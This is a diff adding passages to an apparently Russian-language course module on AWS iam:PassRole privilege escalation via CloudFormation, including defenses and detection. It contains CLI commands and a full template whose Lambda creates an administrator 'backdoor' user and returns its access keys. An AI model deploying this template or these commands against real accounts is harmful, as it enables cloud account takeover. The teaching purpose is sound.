@@ -208,6 +208,120 @@ $ aws cloudformation describe-stacks --stack-name prod --query 'Stacks[0].Output
 - Наличие permissions boundary и SCP.
 - Azure: managed identity, назначенные на ресурсы, и их роли.
 
+## Реальная сессия: вывод CLI целиком
+
+Разберём, как выглядит атака от начала до конца. Сначала убеждаемся, что у нашей роли есть `iam:PassRole` — без неё весь трюк невозможен:
+
+```bash
+$ aws iam list-attached-role-policies --role-name ci-runner --output text
+arn:aws:iam::111122223333:policy/PassRoleForDeploy   ci-runner
+$ aws iam get-policy-version --policy-arn arn:aws:iam::111122223333:policy/PassRoleForDeploy \
+  --version-id v1 --query 'PolicyVersion.Document' | jq
+{ "Statement": [ { "Effect": "Allow", "Action": "iam:PassRole",
+  "Resource": "arn:aws:iam::111122223333:role/AdminDeploy" } ] }
+```
+
+Роль `AdminDeploy` при этом имеет `AdministratorAccess`. Значит, мы можем передать её любому сервису, который принимает роль, — например, CloudFormation. Пишем минимальный шаблон, создающий пользователя с ключом и админской политикой, и запускаем стек:
+
+```bash
+$ aws cloudformation create-stack --stack-name pwn \
+  --template-body file://pwn.yaml --capabilities CAPABILITY_NAMED_IAM \
+  --role-arn arn:aws:iam::111122223333:role/AdminDeploy
+$ aws cloudformation describe-stacks --stack-name pwn \
+  --query 'Stacks[0].StackStatus'
+"CREATE_COMPLETE"
+```
+
+CloudFormation создаёт ресурсы **от имени переданной роли**, то есть от `AdminDeploy`. После `CREATE_COMPLETE` достаём созданный ключ из Outputs и получаем админский доступ.
+
+## Почему это работает: механика PassRole
+
+`iam:PassRole` — это разрешение «отдать роль сервису», а не «использовать роль». Сама по себе она безобидна, но в связке с сервисом, который умеет создавать ресурсы и запускать код (CloudFormation, EC2, Lambda, ECS), превращается в эскалацию: сервис действует от переданной роли, а вы — через сервис. Опасность в том, что многие политики выдают `PassRole` с `Resource: "*"` или на слишком широкую роль. Защита — ограничить `Resource` конкретными ролями и не давать `PassRole` на роли с админскими правами.
+
+## ARM и Azure: та же логика
+
+В Azure аналог — `Microsoft.Resources/deployments` с `roleDefinitionId`: шаблон ARM создаёт role assignment от имени развёртывающей identity. Если у вас есть `Microsoft.Authorization/roleAssignments/write` (или возможность развернуть шаблон с таким ресурсом), вы назначаете себе `Owner`. Синтаксис другой, суть та же: сервис развёртывания действует от вашей identity, а шаблон решает, что именно создать.
+
+## Что ломает атаку
+
+- **SCP (Service Control Policies).** На уровне организации могут запрещать создание IAM-пользователей или назначение админских ролей — тогда стек не соберётся.
+- **Permissions boundary.** Если у `AdminDeploy` стоит граница, эффективные права не превысят её.
+- **`PassRole` с условием `iam:PassedToService`.** Ограничивает, каким сервисам можно передать роль; обойти можно только другим сервисом из списка.
+- **Обнаружение.** `CREATE_STACK` с IAM-ресурсами виден в CloudTrail; аномальный стек в чужом аккаунте — сильный сигнал.
+
+## Полный шаблон: Custom Resource создаёт админского пользователя
+
+`UserData` работает, но требует запуска EC2 (медленно, шумно). Короче — **Custom Resource**: CloudFormation вызывает Lambda, а та от имени роли исполнения создаёт IAM-пользователя. Полный `pwn.yaml`:
+
+```yaml
+Resources:
+  Fn:
+    Type: AWS::Lambda::Function
+    Properties:
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt FnRole.Arn
+      Code:
+        ZipFile: |
+          import boto3, cfnresponse
+          def handler(event, ctx):
+              iam = boto3.client('iam')
+              iam.create_user(UserName='backdoor')
+              k = iam.create_access_key(UserName='backdoor')['AccessKey']
+              iam.attach_user_policy(UserName='backdoor',
+                  PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+              cfnresponse.send(event, ctx, cfnresponse.SUCCESS,
+                  {'Key': k['AccessKeyId'], 'Secret': k['SecretAccessKey']})
+  FnRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement: [{Effect: Allow, Principal: {Service: lambda.amazonaws.com}, Action: sts:AssumeRole}]
+      ManagedPolicyArns: [arn:aws:iam::aws:policy/AdministratorAccess]
+  Done:
+    Type: Custom::Done
+    Properties:
+      ServiceToken: !GetAtt Fn.Arn
+Outputs:
+  KeyId:  {Value: !GetAtt Done.Key}
+  Secret: {Value: !GetAtt Done.Secret}
+```
+
+Ключевое: и Lambda, и её роль создаются **от имени переданной роли исполнения** (у которой `AdministratorAccess`), поэтому создание админ-пользователя разрешено. После `CREATE_COMPLETE` ключи достаются из Outputs:
+
+```bash
+$ aws cloudformation describe-stacks --stack-name pwn \
+    --query 'Stacks[0].Outputs' --output table
+```
+
+```text
+| KeyId  | AKIA...            |
+| Secret | wJalrXUtnFEMI...   |
+```
+
+Так атака завершается за секунды и без EC2 — весь путь укладывается в один шаблон.
+
+## Справочная таблица: сервисы, которым пробрасывают роль
+
+| Сервис | Что даёт проброшенная роль | Скорость |
+|--------|----------------------------|----------|
+| CloudFormation | создаёт любые ресурсы, включая IAM | минуты |
+| EC2 | `UserData` от root + metadata-креды | минуты |
+| Lambda | выполнение кода от имени роли | секунды |
+| ECS/EKS task | контейнер с креды роли | минуты |
+| Glue | выполнение скрипта от имени роли | минуты |
+| CodeBuild | сборка с ролью | минуты |
+
+Lambda и CloudFormation-стек — самые быстрые: не нужно ждать загрузки ОС, код исполняется сразу. Если `PassRole` ограничен условием `iam:PassedToService`, из таблицы берут сервис, который в этом условии разрешён.
+
+## Ограничения и следы
+
+- **CloudTrail.** `CreateStack` с IAM-ресурсами, `CreateUser`, `CreateAccessKey` и `AttachUserPolicy` попадают в журнал; аномальный стек в аккаунте — сильный сигнал SOC.
+- **GuardDuty.** Правила `PrivilegeEscalation:IAMUser/AdministrativePermissions` ловят именно такие цепочки.
+- **Permissions boundary и SCP.** Если у переданной роли есть граница или организация запрещает IAM-изменения, стек не соберётся.
+- **Пароль в Default.** Как в лабораторной задаче: у параметра шаблона есть `Default`-пароль, и он виден любому, кто читает шаблон, — это самостоятельная утечка.
+
 ## Квиз
 
 Проверь себя.
